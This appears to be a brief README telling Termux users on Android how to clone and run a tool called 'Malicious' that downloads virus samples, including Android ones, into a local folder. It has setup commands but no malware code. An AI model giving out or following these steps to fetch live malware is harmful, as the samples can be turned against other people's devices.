# Malicious

$termux-setup-storage

$cd /sdcard

$git clone https://github.com/Hider5/Malicious

$cd Malicious

$apt-get install python2

$pip2 install -r requirements.txt

$python2 malicious.py

# after download virus open your file explorer
# find folder Malicious and open it
# chose and open folder Android if you download virus Android
